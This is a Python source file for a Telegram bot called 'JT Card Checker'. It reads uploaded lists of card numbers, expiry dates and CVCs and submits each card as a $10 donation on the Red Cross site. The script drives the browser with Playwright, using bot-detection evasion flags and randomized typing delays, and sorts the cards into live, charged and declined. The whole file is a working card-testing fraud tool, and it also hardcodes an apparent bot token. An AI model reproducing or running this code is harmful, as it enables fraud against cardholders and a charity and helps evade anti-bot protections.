```python
import os
import random
import asyncio
import logging
import threading
from io import BytesIO
from datetime import datetime
from flask import Flask
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, BufferedInputFile
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from playwright.async_api import async_playwright

# --- CONFIG ---
BOT_TOKEN = "8103948431:AAEZgtxTZPA1tvuo8Lc6iA5-UZ7RFiqSzhs"
TELEGRAM_USERNAME = "@Str_JT"

# --- RENDER PORT BINDING ---
app = Flask(__name__)

@app.route('/')
def health(): 
    return "BOT ACTIVE", 200

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

# --- GLOBAL STATE ---
stop_flags = {}

# --- BOT SETUP ---
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

# --- CARD CHECKER FUNCTION ---
async def check_card(card_data, user_info):
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=['--disable-blink-features=AutomationControlled', '--disable-dev-shm-usage', '--no-sandbox']
        )
        
        context = await browser.new_context(
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            viewport={'width': 1920, 'height': 1080}
        )
        
        page = await context.new_page()
        
        try:
            await page.goto("https://www.redcross.org/donate/donation.html/", wait_until='domcontentloaded', timeout=30000)
            await asyncio.sleep(random.uniform(0.5, 1.5))
            
            amount_field = await page.query_selector('input[placeholder*="Amount"], input[name*="amount"]')
            if amount_field:
                await amount_field.fill("10", delay=random.randint(50, 150))
            await asyncio.sleep(random.uniform(0.3, 0.7))
            
            continue_btn = await page.query_selector('button:has-text("Continue"), button[type="submit"]')
            if continue_btn:
                await continue_btn.click()
            await asyncio.sleep(random.uniform(0.5, 1.0))
            
            credit_btn = await page.query_selector('button[aria-label*="credit"], button:has-text("Credit")')
            if credit_btn:
                await credit_btn.click()
            await asyncio.sleep(random.uniform(0.5, 1.0))
            
            first_name = await page.query_selector('input[name*="first"], input[id*="first"]')
            if first_name:
                await first_name.fill(user_info['first'], delay=random.randint(50, 150))
            
            last_name = await page.query_selector('input[name*="last"], input[id*="last"]')
            if last_name:
                await last_name.fill(user_info['last'], delay=random.randint(50, 150))
            
            email = await page.query_selector('input[name*="email"], input[type="email"]')
            if email:
                await email.fill(user_info['email'], delay=random.randint(50, 150))
            
            phone = await page.query_selector('input[name*="phone"], input[type="tel"]')
            if phone:
                await phone.fill(user_info['phone'], delay=random.randint(50, 150))
            
            await asyncio.sleep(random.uniform(0.5, 1.0))
            
            address = await page.query_selector('input[name*="address"]')
            if address:
                await address.fill(user_info['address'], delay=random.randint(50, 150))
            
            city = await page.query_selector('input[name*="city"]')
            if city:
                await city.fill(user_info['city'], delay=random.randint(50, 150))
            
            state = await page.query_selector('select[name*="state"]')
            if state:
                await state.select_option(user_info['state'])
            
            zipcode = await page.query_selector('input[name*="zip"]')
            if zipcode:
                await zipcode.fill(user_info['zip'], delay=random.randint(50, 150))
            
            await asyncio.sleep(random.uniform(0.5, 1.0))
            
            ccn, mm, yy, cvc = card_data.split('|')
            
            card_frame = page.frames[0] if len(page.frames) > 1 else page
            
            card_num = await card_frame.query_selector('input[name*="card"], input[placeholder*="card"]')
            if card_num:
                await card_num.fill(ccn, delay=random.randint(80, 200))
            
            exp = await card_frame.query_selector('input[name*="exp"], input[placeholder*="exp"]')
            if exp:
                await exp.fill(f"{mm}/{yy}", delay=random.randint(80, 200))
            
            cvv = await card_frame.query_selector('input[name*="cv"], input[name*="cvc"]')
            if cvv:
                await cvv.fill(cvc, delay=random.randint(80, 200))
            
            await asyncio.sleep(random.uniform(0.5, 1.0))
            
            submit_btn = await page.query_selector('button:has-text("Donate"), button[type="submit"]')
            if submit_btn:
                await submit_btn.click()
            
            await page.wait_for_load_state("networkidle", timeout=30000)
            
            result_text = await page.content()
            url = page.url
            
            if "thank you" in result_text.lower() or "success" in result_text.lower():
                return "charged", f"Card Charged | {card_data}"
            elif "approved" in result_text.lower():
                return "live", f"Card Live | {card_data}"
            else:
                return "die", f"Card Declined | {card_data}"
                
        except Exception as e:
            return "die", f"Error: {str(e)[:100]} | {card_data}"
        finally:
            await context.close()
            await browser.close()

# --- UI KEYBOARDS ---
def stop_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="STOP 🛑", callback_data="stop_process")]
    ])

# --- HANDLERS ---
@dp.message(Command("start"))
async def cmd_start(message: Message):
    await message.answer(
        f"💳 <b>JT Card Checker</b>\n\n"
        f"To check a list, upload a <code>.txt</code> file and reply to it with <code>/mtxt</code>.\n\n"
        f"Support: {TELEGRAM_USERNAME}"
    )

@dp.callback_query(F.data == "stop_process")
async def handle_stop(callback: CallbackQuery):
    stop_flags[callback.from_user.id] = True
    await callback.answer("Stopping current check...")

@dp.message(Command("mtxt"))
async def process_mtxt(message: Message):
    if not message.reply_to_message or not message.reply_to_message.document:
        return await message.answer("❌ Reply to a <code>.txt</code> file with /mtxt")
    
    uid = message.from_user.id
    stop_flags[uid] = False
    
    status_msg = await message.answer("🔄 <b>Downloading file...</b>", reply_markup=stop_kb())
    
    file = await bot.get_file(message.reply_to_message.document.file_id)
    file_content = await bot.download_file(file.file_path)
    cards = file_content.read().decode('utf-8').strip().split('\n')
    
    total = len(cards)
    
    live_list = []
    charged_list = []
    die_list = []
    
    live, charged, die = 0, 0, 0
    
    user_info = {
        'first': 'John',
        'last': 'Smith',
        'email': 'johnsmith@gmail.com',
        'phone': '5551234567',
        'address': '123 Main St',
        'city': 'New York',
        'state': 'NY',
        'zip': '10001'
    }
    
    for i, card in enumerate(cards, 1):
        if stop_flags.get(uid):
            await status_msg.edit_text(f"🛑 <b>Checking Stopped.</b>\n\nFinal Stats:\n✅ Live: {live}\n⚡ Charged: {charged}\n❌ Die: {die}")
            break
        
        card = card.strip()
        if '|' not in card or len(card.split('|')) != 4:
            die += 1
            die_list.append(f"Invalid Format | {card}")
            continue
        
        result, details = await check_card(card, user_info)
        
        if result == "live":
            live += 1
            live_list.append(details)
        elif result == "charged":
            charged += 1
            charged_list.append(details)
        else:
            die += 1
            die_list.append(details)
        
        if i % 2 == 0 or i == total:
            ui_text = (
                f"🔎 <b>Checking Cards...</b>\n"
                f"━━━━━━━━━━━━━━━\n"
                f"✅ <b>Live:</b> <code>{live}</code>\n"
                f"⚡ <b>Charged:</b> <code>{charged}</code>\n"
                f"❌ <b>Declined:</b> <code>{die}</code>\n"
                f"━━━━━━━━━━━━━━━\n"
                f"Progress: <code>{i}/{total}</code>"
            )
            try:
                await status_msg.edit_text(ui_text, reply_markup=stop_kb())
            except:
                pass
        
        await asyncio.sleep(0.5)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    output = f"=== CARD CHECK RESULTS ===\n"
    output += f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    output += f"Total: {total} | Live: {live} | Charged: {charged} | Declined: {die}\n\n"
    
    if live_list:
        output += "--- LIVE CARDS ---\n"
        output += "\n".join(live_list) + "\n\n"
    
    if charged_list:
        output += "--- CHARGED CARDS ---\n"
        output += "\n".join(charged_list) + "\n\n"
    
    if die_list:
        output += "--- DECLINED CARDS ---\n"
        output += "\n".join(die_list) + "\n\n"
    
    file_bytes = BytesIO(output.encode('utf-8'))
    file_bytes.name = f'results_{timestamp}.txt'
    
    await message.answer_document(
        BufferedInputFile(file_bytes.getvalue(), filename=f'results_{timestamp}.txt'),
        caption=f"🏁 <b>Check Completed!</b>\n\n✅ Live: <code>{live}</code>\n⚡ Charged: <code>{charged}</code>\n❌ Declined: <code>{die}</code>"
    )

# --- MAIN ---
async def main():
    threading.Thread(target=run_flask, daemon=True).start()
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
```
